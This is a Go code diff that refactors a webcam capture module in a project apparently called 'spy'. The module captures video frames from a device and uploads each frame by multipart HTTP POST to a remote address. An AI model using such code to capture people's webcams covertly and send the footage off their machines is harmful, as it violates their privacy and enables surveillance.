@@ -8,6 +8,8 @@ import (
 	"mime/multipart"
 	"net/http"
 	"time"
+
+	"github.com/cinus-e/spy/internal/literr"
 )
 
 type Params struct {
@@ -16,37 +18,41 @@ type Params struct {
 	Verbose           bool
 }
 
-var (
-	verbose = false
-	running = false
-)
+type Capture struct {
+	verbose, running bool
+	device           *Device
+}
 
-func StartCapture(p Params) (err error) {
-	verbose = p.Verbose
-	running = true
+func (c *Capture) StartCapture(p Params) (err error) {
+	c.verbose = p.Verbose
+	c.running = true
 	data := make(chan []byte, 200000)
 	device, err := NewVideoCapturer(p.DeviceID, p.Quality, data)
 	if err != nil {
 		return
 	}
+	c.device = device
 	go func() {
-		if err = device.Capture(); err != nil {
-			running = false
+		if literr.CheckError(device.Capture()) {
+			c.running = false
 		}
 	}()
-	for running {
+	for c.running {
 		frame := <-data
 		if frame != nil {
-			if err := write(frame, p.Address); err != nil {
-				fmt.Println(err)
-			}
+			literr.CheckError(c.write(frame, p.Address))
 		}
 		time.Sleep(1 * time.Millisecond)
 	}
 	return
 }
 
-func write(data []byte, address string) error {
+func (c *Capture) Close() error {
+	c.running = false
+	return c.device.Close()
+}
+
+func (c *Capture) write(data []byte, address string) error {
 	buffer := &bytes.Buffer{}
 	writer := multipart.NewWriter(buffer)
 	fileWriter, _ := writer.CreateFormFile("files", "webcam")
@@ -54,7 +60,7 @@ func write(data []byte, address string) error {
 	if err != nil {
 		return err
 	}
-	if verbose {
+	if c.verbose {
 		fmt.Printf("Frame size : %d bytes, write bytes : %d", len(data), written)
 	}
 	writer.Close()
@@ -68,7 +74,7 @@ func write(data []byte, address string) error {
 	if err != nil {
 		return err
 	}
-	if verbose {
+	if c.verbose {
 		fmt.Printf(" status:%s response:%s\n", resp.Status, string(respBody))
 	}
 	return nil
